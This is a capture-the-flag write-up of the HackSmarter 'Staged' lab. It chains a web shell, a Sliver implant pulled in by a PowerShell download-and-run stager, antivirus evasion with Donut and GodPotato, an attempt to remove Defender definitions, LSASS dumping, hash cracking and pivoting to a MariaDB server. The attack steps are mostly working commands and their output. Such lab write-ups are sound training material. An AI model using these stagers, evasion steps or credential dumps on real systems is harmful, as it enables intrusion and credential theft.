---
title: "Staged"
platform: "HackSmarter"
category: "Windows"
difficulty: "Medium"
date: 2025-12-19
os: "Windows Server 2022 / Ubuntu 22.04"
tags: ["windows", "linux", "sliver", "c2", "av-bypass", "seimpersonate", "godpotato", "donut", "ligolo", "pivoting", "credential-dumping", "mysql", "uwu-toolkit"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/staged/img-000.png" alt="Staged Banner" style="max-width: 100%;" />
</div>

---

## Objective / Scope

You are a member of the **Hack Smarter Red Team** and have been assigned to perform a black-box penetration test against a client's critical infrastructure. The scope is strictly limited to the following hostnames:

- **web.hacksmarter**: Public-facing Windows Web Server (Initial Access Point). **Windows Defender is enabled.**
- **sqlsrv.hacksmarter**: Internal Linux MySQL Database Server.

The exercise is considered **complete** upon successfully retrieval the final flag from `sqlsrv.hacksmarter`

Any activity outside of these two hosts or their associated network interfaces is strictly prohibited.

---

## Lab Starting Point

During the beginning of the engagement, another operator exploited a file upload vulnerability, and they have provided you with a web shell.

```
http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami
```

---

## Box Details

**Platform:** Hacksmarter
**Operating System:** Windows and Linux
**Difficulty:** Medium
**Linux - MySQL Server:** `10.0.18.213`
**Windows - Web Server:** `10.0.29.199`

> **Note:** This write up is demonstrating **[UwU Toolkit](https://github.com/p3ta00/uwu-toolkit)** for debugging and development. You can still follow along since the path is still the same, but execution will differ.

---

## Enumeration

### Testing the initial webshell

```bash
curl http://web.hacksmarter/hacksmarter/shell.php\?cmd\=whoami
```

```
ec2amaz-ibnmck4\j.smith
```

### Start UwU

```
Exegol ➜ /workspace x uwu

██╗   ██╗██╗    ██╗██╗   ██╗
██║   ██║██║    ██║██║   ██║
██║   ██║██║ █╗ ██║██║   ██║
██║   ██║██║███╗██║██║   ██║
╚██████╔╝╚███╔███╔╝╚██████╔╝
 ╚═════╝  ╚══╝╚══╝  ╚═════╝  Toolkit
═══════════════════════════════════════════════════════════
                    ⚡ H A C K  T H E  P L A N E T ⚡
═══════════════════════════════════════════════════════════

╔═══════════════════════════════════════════════════╗
║      Modular Penetration Testing Framework        ║
╚═══════════════════════════════════════════════════╝

 Type 'help' for available commands

 70 modules loaded
   - 4 exploits
   - 41 auxiliary
   - 10 enumeration
   - 13 post
   - 2 payloads

UwU Toolkit >
```

### Run Sliver Start to execute the sliver server

```
UwU Toolkit > sliver start
```

### Run Sliver Connect to connect to the server

```
UwU Toolkit > sliver connect

╔══════════════════════════════════════════════════════╗
║           Sliver C2 Interactive Mode                 ║
║  Ctrl+D - Background and return to UwU               ║
║  exit   - Exit Sliver and return to UwU              ║
╚══════════════════════════════════════════════════════╝

? Select a server: uwu@127.0.0.1 (40f070f5d5a6d084)
Connecting to 127.0.0.1:31337 ...
[*] Loaded 22 aliases from disk
[*] Loaded 151 extension(s) from disk

███████╗██╗     ██╗██╗   ██╗███████╗██████╗
██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
███████╗██║     ██║██║   ██║█████╗  ██████╔╝
╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain scavenge
[*] Server v1.5.44 - 9122878cbbcae543eb8210f616550382af2065fd
[*] Welcome to the sliver shell, please type 'help' for options
[*] Check for updates with the 'update' command

sliver >
```

> I will be using my custom AV bypass payload so your implants might be different. I'll be releasing a detailed walkthrough on this technique shortly. Review sliver documentation to make modifications.

### Generate Sliver Implant

```
sliver > generate --mtls 10.200.24.159:443 --format shellcode --os windows --arch amd64 --save implant.bin

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 21s
[*] Encoding shellcode with shikata ga nai ... success!
[*] Implant saved to /opt/uwu-toolkit/implant.bin
```

### Modify the stager.ps1 file for the stager

```powershell
# ========================================
# CONFIGURATION - Modify these values
# ========================================
$runnerUrl = "http://10.200.24.159:8000/runner.exe"
$implantUrl = "http://10.200.24.159:8000/implant.enc"
```

### Move the payload from uwu to /workspace for exegol

```
Exegol ➜ /workspace x cp /opt/uwu-toolkit/implant.bin .
Exegol ➜ /workspace x ll
.rwx------ 16M root 19 Dec 10:25  implant.bin
.rw-r----- 8.6M root 19 Dec 10:20  runner.exe
.rw-r----- 2.5k root 19 Dec 10:23  stager.ps1
```

### Convert the .bin to a .enc using base64

```bash
base64 -w0 implant.bin > implant.enc
```

### Execute command to run the payload

```
IEX(IWR -UseBasicParsing http://10.200.19.126:8000/stager.ps1)
```

### Start GOSH web server

```
start gosh 8000
```

### Open the dashboard to monitor connections

```
uwu_dashboard
```

<div style="text-align: center;">
  <img src="/assets/images/ctf/staged/img-001.png" alt="UwU Dashboard" style="max-width: 100%;" />
</div>

### Execute the payload through the web shell

```
UwU Toolkit > shell curl -G 'http://web.hacksmarter/hacksmarter/shell.php' --data-urlencode 'cmd=powershell.exe IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager.ps1)'
^C
[*] Use 'exit' to quit
```

We can see from the uwu_dashboard that the victim system did make the web requests to our web server:

<div style="text-align: center;">
  <img src="/assets/images/ctf/staged/img-002.png" alt="UwU Dashboard showing HTTP requests" style="max-width: 100%;" />
</div>

### Validating the connection to sliver

We connect back to our sliver server:

```
UwU Toolkit > sliver connect

╔══════════════════════════════════════════════════════╗
║           Sliver C2 Interactive Mode                 ║
║  Ctrl+D - Background and return to UwU               ║
║  exit   - Exit Sliver and return to UwU              ║
╚══════════════════════════════════════════════════════╝

? Select a server: uwu@127.0.0.1 (40f070f5d5a6d084)
Connecting to 127.0.0.1:31337 ...
[*] Loaded 22 aliases from disk
[*] Loaded 151 extension(s) from disk

 ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
      ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain epic
[*] Server v1.5.44 - 9122878cbbcae543eb8210f616550382af2065fd
[*] Welcome to the sliver shell, please type 'help' for options
[*] Check for updates with the 'update' command

sliver > sessions

 ID         Name             Transport   Remote Address        Hostname          Username   Operating System   Locale   Last Message                                Health
========== ================= =========== ==================== ================= ========== ================== ======== ======================================== =========
 993d71df   ECONOMIC_BELFRY   mtls        10.0.29.199:49951    EC2AMAZ-IBNMCK4   j.smith    windows/amd64      en-US    Fri Dec 19 11:06:05 PST 2025 (13s ago)   [ALIVE]

sliver >
```

---

## Privilege Enumeration

### The user has SeImpersonatePrivilege

```
sliver (ECONOMIC_BELFRY) > sa-whoami

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName                                  SID
========================================= =============================================
EC2AMAZ-IBNMCK4\j.smith                   S-1-5-21-2241703281-3926990712-2237856116-1002

GROUP INFORMATION                         Type                SID                                            Attributes
========================================= =================== ============================================== ======================
EC2AMAZ-IBNMCK4\None                      Group               S-1-5-21-2241703281-3926990712-2237856116-513  Mandatory group, Enabled by default, Enabled group,
Everyone                                  Well-known group    S-1-1-0                                        Mandatory group, Enabled by default, Enabled group,
BUILTIN\Remote Management Users           Alias               S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users                             Alias               S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\SERVICE                      Well-known group    S-1-5-6                                        Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                             Well-known group    S-1-2-1                                        Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users          Well-known group    S-1-5-11                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization            Well-known group    S-1-5-15                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account                Well-known group    S-1-5-113                                      Mandatory group, Enabled by default, Enabled group,
LOCAL                                     Well-known group    S-1-2-0                                        Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication          Well-known group    S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group,
Mandatory Label\High Mandatory Level      Label               S-1-16-12288                                   Mandatory group, Enabled by default, Enabled group,

Privilege Name                            Description                                        State
========================================= ================================================== ========
SeChangeNotifyPrivilege                   Bypass traverse checking                           Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication          Enabled
SeCreateGlobalPrivilege                   Create global objects                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                     Disabled
```

---

## Privilege Escalation

### Using the UwU Toolkit GodPotato module (AV Blocked)

We attempt to run and identify AV is blocking it:

```
[+] Using module: post/seimpersonate
UwU Toolkit seimpersonate > options

Module options:

Name              Current             Required   Description
----------------- ------------------- ---------- ---------------------------------------------
AUTO_EXEC         yes                 no         Auto-execute through Sliver session (sliver mode)
DOMAIN                                no         Domain name
EXECUTE           whoami              yes        Command to execute as SYSTEM
EXEC_PROTOCOL     mssql               no         Protocol for command execution
LHOST                                 no         Local host IP for RoguePotato
LPORT             1337                no         Local port for JuicyPotato
MODE              sliver              no         Execution mode: sliver (generate commands), netexec (credentials), or session (tmux)
PASS                                  no         Password or NTLM hash
POTATO            godpotato           no         Potato exploit to use
POTATO_PATH                           no         Local path to potato binary (auto-detect if empty)
REMOTE_PATH       C:\Windows\Temp     no         Remote path to upload potato
RHOSTS                                no         Target IP address
SESSION                               no         Tmux session/pane for Sliver or Evil-WinRM
SRVHOST           10.200.24.159       no         HTTP server IP for http upload method (your IP)
SRVPORT           8000                no         HTTP server port
UPLOAD            yes                 no         Upload potato before executing
UPLOAD_METHOD     http                no         Upload method: smb (admin share) or http (certutil download)
USER                                  no         Username for authentication

UwU Toolkit seimpersonate > run
[*] Running seimpersonate...

[*] Mode: Sliver
[*] Potato: GODPOTATO
[*] GodPotato - Works on Windows 8-11, Server 2012-2022
[*] Local binary: /opt/my-resources/tools/potatoes/GodPotato.exe
[*] Using Sliver config: /root/.sliver-client/configs/uwu_127.0.0.1.cfg
[+] Connected to Sliver server
[+] Using session: ECONOMIC_BELFRY (10.0.29.199:49951)

[*] Step 1: Uploading potato to target...
[+] Uploaded GodPotato.exe to C:\Windows\Temp\GodPotato.exe

[*] Step 2: Executing potato...
[*] Command: C:\Windows\Temp\GodPotato.exe -cmd "whoami"

[-] Sliver API error: <AioRpcError of RPC that terminated with:
        status = StatusCode.UNKNOWN
        details = "fork/exec C:\Windows\Temp\GodPotato.exe: Operation did not complete successfully because the file contains a virus or potentially unwanted software."
        debug_error_string = "UNKNOWN:Error received from peer {grpc_message:"fork/exec C:\\Windows\\Temp\\GodPotato.exe: Operation did not complete successfully because the file contains a virus or potentially unwanted software.", grpc_status:2}"
>
```

### We can attempt to bypass this with our AVBypass and donut

```
Exegol ➜ /workspace x donut -i GodPotato.exe -a 2 -b 2 -p '-cmd "cmd /c net user administrator [REDACTED]"' -o ./gp.bin

[*] Processing: GodPotato.exe
[*] Architecture: x64
[+] Shellcode saved to: ./gp.bin
[+] Size: 76908 bytes
```

### Modify the stager to stager_gp.ps1 and encode gp.bin to gp.enc

```bash
base64 -w0 gp.bin > gp.enc
```

### Then execute the payload through the webshell or sliver session

```
shell curl -G 'http://web.hacksmarter/hacksmarter/shell.php' --data-urlencode 'cmd=powershell.exe IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager_gp.ps1)'
```

```
UwU Toolkit seimpersonate > shell curl -G 'http://web.hacksmarter/hacksmarter/shell.php' --data-urlencode 'cmd=powershell.exe IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager_gp.ps1)'

[+] PowerShell Stager Starting...
[+] Downloading runner.exe from: http://10.200.24.159:8000/runner.exe
[*] Temp path: C:\Users\j.smith\AppData\Local\Temp\runner_4bbb51d3.exe
[+] Runner downloaded successfully
[*] File size: 8638464 bytes
[+] Executing: C:\Users\j.smith\AppData\Local\Temp\runner_4bbb51d3.exe -remote http://10.200.24.159:8000/gp.enc
[+] Loading shellcode from remote URL...
[+] Runner started with PID: 4920
[+] Stager completed successfully
[+] Shellcode decoded. Executing...
[*] CombaseModule: 0x140718841397248
[*] DispatchTable: 0x140718843988296
[*] UseProtseqFunction: 0x140718843282816
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\a22f48c2-efcd-4ca5-b4cf-f162c9b27655\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009c02-1338-ffff-1f85-d1880b6c8bd5
[*] DCOM obj OXID: 0x6b212c329f0ad3d4
[*] DCOM obj OID: 0xad9df5a85b14f5ad
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 856 Token:0x476 User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 664
The command completed successfully.
```

### Set your credentials for the admin to test

```
UwU Toolkit seimpersonate > creds add administrator [REDACTED]
[+] Added credential: administrator
```

### Set the creds to use administrator

```
UwU Toolkit netexec > creds use 1
[*] USER => administrator
[*] PASS => [REDACTED]
[+] Loaded credential: 1
```

### I attempted to test authentication with SMB but never ran NMAP to verify the port

```
UwU Toolkit nmap_scan > run
[*] Running nmap_scan...

[*] Running standard scan against 10.0.29.199
[*] Command: nmap -sC -sV -T4 -oA /workspace/./nmap_results/scan_10.0.29.199_standard 10.0.29.199

Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-19 12:11 PST
Nmap scan report for web.hacksmarter (10.0.29.199)
Host is up (0.071s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
| http-title: Welcome to XAMPP
|_Requested resource was http://web.hacksmarter/dashboard/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
443/tcp  open  ssl/http      Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-title: Welcome to XAMPP
|_Requested resource was https://web.hacksmarter/dashboard/
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: EC2AMAZ-IBNMCK4
|   NetBIOS_Domain_Name: EC2AMAZ-IBNMCK4
|   NetBIOS_Computer_Name: EC2AMAZ-IBNMCK4
|   DNS_Domain_Name: EC2AMAZ-IBNMCK4
|   DNS_Computer_Name: EC2AMAZ-IBNMCK4
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-19T20:12:06+00:00
|_ssl-date: 2025-12-19T20:12:11+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-IBNMCK4
| Not valid before: 2025-09-09T01:57:20
|_Not valid after:  2026-03-11T01:57:20
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
```

### SMB is not open but RDP is, we can verify the credentials with nxc

```
UwU Toolkit netexec > run
[*] Running netexec...

[*] Target: 10.0.29.199
[*] User: administrator
[*] Protocol: RDP
[*] Action: check

[*] Executing: NetExec rdp 10.0.29.199 -u administrator -p [REDACTED]

[*] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  Windows 10 or Windows Server 2016 Build 20348 (name:EC2AMAZ-IBNMCK4) (domain:EC2AMAZ-IBNMCK4) (nla:True)
[+] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  [+] EC2AMAZ-IBNMCK4\administrator:[REDACTED] (admin)
```

### Testing it with whoami (RDP can take a while)

```
UwU Toolkit netexec > run
[*] Running netexec...

[*] Target: 10.0.29.199
[*] User: administrator
[*] Protocol: RDP
[*] Action: execute

[*] Executing: echo y | NetExec rdp 10.0.29.199 -u administrator -p [REDACTED] -x whoami

[*] [!] Executing remote command via RDP will disconnect the Windows session (not log off) if the targeted user is connected via RDP, do you want to continue ? [Y/n] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  Windows 10 or Windows Server 2016 Build 20348 (name:EC2AMAZ-IBNMCK4) (domain:EC2AMAZ-IBNMCK4) (nla:True)
[+] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  [+] EC2AMAZ-IBNMCK4\administrator:[REDACTED] (admin)
[+] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  [+] Executing command: whoami with delay 5 seconds
[+] RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  [+] Waiting for clipboard to be ready...
    RDP  10.0.29.199  3389  EC2AMAZ-IBNMCK4  ec2amaz-ibnmck4\administrator

[+] Module completed successfully
```

### I built a Donut module into uwu and using this we might be able to disable AV

```
UwU Toolkit donut > setg PARAMS '-cmd "cmd /c C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All"'
PARAMS => '-cmd "cmd /c C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -RemoveDefinitions -All"' (global)

UwU Toolkit donut > run
[*] Running donut...

[*] Input: /workspace/GodPotato.exe
[*] Output: /workspace/gp.bin
[*] Architecture: x64
[*] Parameters: '-cmd "cmd /c IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager_gp.ps1)"'

[*] Executing: donut /workspace/GodPotato.exe -o /workspace/gp.bin -a 2 -b 3 -e 3 -z 1 -f 1 -t 1 -p '-cmd "cmd /c IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager_gp.ps1)"'

[*] Processing: /workspace/GodPotato.exe
[*] Architecture: x64
[+] [+] Shellcode saved to: /workspace/gp.bin
[+] [+] Size: 76908 bytes
[+] Shellcode generated: /workspace/gp.bin (76908 bytes)
[+] Base64 encoded: /workspace/gp.b64 (102544 chars)
[*] Base64 preview (first 100 chars):
6MD3AADA9wAAETmMLD57QpBKSTMgFccjoZ52GJynIR9OesawIrukZecAAAAAahU4QICJ/jaKXEL7sb4YrRIrNRPbQO0lue28eKo3...

[+] Shellcode generation complete!
```

AV is still enabled on the system. This would be much easier if I would just RDP as admin since it is open but I am stubborn.

### We can generate a token as the administrator

```
sliver (ECONOMIC_BELFRY) > make-token -u administrator -p [REDACTED] -d EC2AMAZ-IBNMCK4 -T LOGON_INTERACTIVE

[*] Successfully impersonated EC2AMAZ-IBNMCK4\administrator. Use `rev2self` to revert to your previous token.

sliver (ECONOMIC_BELFRY) > whoami

Logon ID: EC2AMAZ-IBNMCK4\j.smith
[*] Current Token ID: EC2AMAZ-IBNMCK4\Administrator
```

I could not get a token to work properly, so I just finally used RDP and executed my bypass/implant:

```
IEX(IWR -UseBasicParsing http://10.200.24.159:8000/stager.ps1)
```

<div style="text-align: center;">
  <img src="/assets/images/ctf/staged/img-003.png" alt="RDP Session executing stager" style="max-width: 100%;" />
</div>

```
sliver > use
? Select a session or beacon: SESSION  d2a3674d  ECONOMIC_BELFRY  10.0.29.199:50129  EC2AMAZ-IBNMCK4  EC2AMAZ-IBNMCK4\Administrator  windows/amd64
[*] Active session ECONOMIC_BELFRY (d2a3674d-9d5e-47e5-9dac-f220830178fd)

sliver (ECONOMIC_BELFRY) >
```

### As the admin run getsystem

```
sliver (ECONOMIC_BELFRY) > getsystem

[*] A new SYSTEM session should pop soon...
[*] Session 13565a56 ECONOMIC_BELFRY - 10.0.29.199:50137 (EC2AMAZ-IBNMCK4) - windows/amd64 - Fri, 19 Dec 2025 14:18:59 PST
```

---

## Credential Harvesting

### Hashdump (empty passwords - dump did not work)

```
sliver (ECONOMIC_BELFRY) > hashdump

[*] Successfully executed hashdump
[*] Got output:
Administrator:500:Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
Guest:501:Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
DefaultAccount:503:DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
WDAGUtilityAccount:504:WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
student:1000:student:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
j.smith:1002:j.smith:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
b.morgan:1003:b.morgan:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
p.richardson:1006:p.richardson:1006:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::::
```

These are empty passwords so the dump did not work.

### Run nanodump and pypykatz

```
sliver (ECONOMIC_BELFRY) > nanodump 648 lsass.dmp 1 PMDM

[*] Successfully executed nanodump (coff-loader)
[*] Got output:
Done, to download the dump run:
download lsass.dmp
to get the secretz run:
python3 -m pypykatz lsa minidump lsass.dmp

sliver (ECONOMIC_BELFRY) > download lsass.dmp /workspace
[*] Wrote 9781226 bytes (1 file successfully, 0 files unsuccessfully) to /workspace/lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

### Generate a hashfile

```bash
cat > /workspace/ntlm_hashes.txt << 'EOF'
58a478135a93ac3bf058a5ea0e8fdb71
c2c67b565cbf45f1c6b47c9d20ab138b
54cea054826ad7e3ed45bad5e0b7dc42
EOF
```

### Using the uwu password cracker we identify a couple passwords

```
UwU Toolkit hashcrack > set WORDLIST /home/p3ta/tools/rockyou.txt
WORDLIST => /home/p3ta/tools/rockyou.txt

UwU Toolkit hashcrack > run
[*] Running hashcrack...

[*] Loaded hashes from: /workspace/ntlm_hashes.txt
[*] No hash type specified, attempting to identify...
[+] Detected hash type: NTLM (or MD5 - mode 0) (mode: 1000)
[*] Sample hash: 58a478135a93ac3bf058a5ea0e8fdb71...

[?] Use hash type 1000 (NTLM (or MD5 - mode 0))? [Y/n]: y
[*] Transferring hashes to omarchy...
[*] Running hashcat on omarchy...
[*] Command: hashcat -m 1000 /tmp/uwu_hashes_46968.txt /home/p3ta/tools/rockyou.txt

Warning: Permanently added '172.17.0.1' (ED25519) to the list of known hosts.
hashcat (v7.1.2) starting
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 13.0)
====================
* Device #01: NVIDIA GeForce RTX 4070 Laptop GPU, 6827/7805 MB, 36MCU

OpenCL API (OpenCL 3.0 CUDA 13.0.97) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #02: NVIDIA GeForce RTX 4070 Laptop GPU, skipped

Hashes: 3 digests; 3 unique digests, 1 unique salts
Dictionary cache hit:
* Filename..: /home/p3ta/tools/rockyou.txt
* Passwords.: 14344385

58a478135a93ac3bf058a5ea0e8fdb71:[REDACTED]
c2c67b565cbf45f1c6b47c9d20ab138b:[REDACTED]

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: /tmp/uwu_hashes_46968.txt
Recovered........: 2/3 (66.67%) Digests (total), 2/3 (66.67%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Speed.#01........: 24602.1 kH/s (2.29ms) @ Accel:1024 Loops:1 Thr:64 Vec:1

=== CRACKED ===
58a478135a93ac3bf058a5ea0e8fdb71:[REDACTED]
c2c67b565cbf45f1c6b47c9d20ab138b:[REDACTED]

Connection to 172.17.0.1 closed.
[+] Module completed successfully
```

### We got p.richardson

```
creds add p.richardson [REDACTED]
```

---

## Pivoting with Ligolo-ng

### Use ligolo for the pivot and generate your routes

```
ligolo-ng » ifcreate --name pivot
INFO[0343] Creating a new pivot interface...
INFO[0343] Interface created!

ligolo-ng » route_add --name pivot --route 240.0.0.1/32
INFO[0366] Route created.

ligolo-ng » route_add --name pivot --route 10.0.18.213/32
INFO[0400] Route created.
```

### Use any of the beacons to execute the agent.exe and start the tunnel

```
UwU Toolkit ligolo_pivot > ligolo resume
[+] Resumed Ligolo-ng session
[*] Listening on 0.0.0.0:8443
[*] TUN interface: ligolo

INFO[0516] Agent joined.                                 id=0affedbeebe3 name="EC2AMAZ-IBNMCK4\\j.smith@EC2AMAZ-IBNMCK4" remote="10.0.29.199:50162"

ligolo-ng »
ligolo-ng » session
? Specify a session : 1 - EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4 - 10.0.29.199:50162 - 0affedbeebe3

[Agent : EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4] » start
INFO[0599] Starting tunnel to EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4 (0affedbeebe3)

[Agent : EC2AMAZ-IBNMCK4\j.smith@EC2AMAZ-IBNMCK4] »
```

---

## Internal Enumeration

### Now lets enumerate sqlsrv.hacksmarter

```
UwU Toolkit nmap_scan > set RHOSTS 10.1.237.149
RHOSTS => 10.1.237.149

UwU Toolkit nmap_scan > run
[*] Running nmap_scan...

[*] Running standard scan against 10.1.237.149
[*] Command: nmap -sC -sV -T4 -oA /workspace/./nmap_results/scan_10.1.237.149_standard 10.1.237.149

Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-19 19:26 PST
Nmap scan report for sqlsrv.hacksmarter (10.1.237.149)
Host is up (0.015s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 805d1c63f53101b1699849ae31f5d2e6 (ECDSA)
|_  256 9d6852ac6fbfafe2539ba5f00ec9013d (ED25519)
3306/tcp open  mysql   MySQL 5.5.5-10.6.22-MariaDB-0ubuntu0.22.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.6.22-MariaDB-0ubuntu0.22.04.1
|   Thread ID: 36
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsCompression, SupportsLoadDataLocal, Speaks41ProtocolNew, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, FoundRows, ODBCClient, LongColumnFlag, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: >cXnB<G0WF9-rx%L1Lma
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.93 seconds
```

---

## Database Compromise

### Using the credentials that we identified from p.richardson we can extract the final flag

```
Exegol ➜ /workspace x mysql -h sqlsrv.hacksmarter -u p.richardson -p'[REDACTED]'

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 46
Server version: 10.6.22-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hacksmarter_db     |
| information_schema |
+--------------------+
2 rows in set (0.074 sec)

MariaDB [(none)]> use hacksmarter_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [hacksmarter_db]> show tables;
+--------------------------+
| Tables_in_hacksmarter_db |
+--------------------------+
| final_config             |
+--------------------------+
1 row in set (0.074 sec)

MariaDB [hacksmarter_db]> select * from final_config;
+----+-----------------+------------------------------------------+
| id | key_name        | key_value                                |
+----+-----------------+------------------------------------------+
|  1 | admin_api_token | FLAG{REDACTED}                           |
|  2 | system_status   | Operational                              |
+----+-----------------+------------------------------------------+
2 rows in set (0.074 sec)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **[UwU Toolkit](https://github.com/p3ta00/uwu-toolkit)** | Integrated penetration testing framework |
| **Sliver C2** | Command and control, implant management |
| **Donut** | PE to shellcode conversion (AV bypass) |
| **GodPotato** | SeImpersonate privilege escalation |
| **Nanodump** | LSASS memory dumping |
| **Pypykatz** | Credential extraction from minidumps |
| **Hashcat** | GPU-accelerated password hash cracking |
| **Ligolo-ng** | Network pivoting and tunneling |
| **NetExec (nxc)** | Protocol enumeration and validation |
| **Nmap** | Port scanning and service enumeration |

---

## References

- [Sliver C2 Documentation](https://github.com/BishopFox/sliver)
- [GodPotato - SeImpersonate Exploitation](https://github.com/BeichenDream/GodPotato)
- [Donut - Shellcode Generator](https://github.com/TheWover/donut)
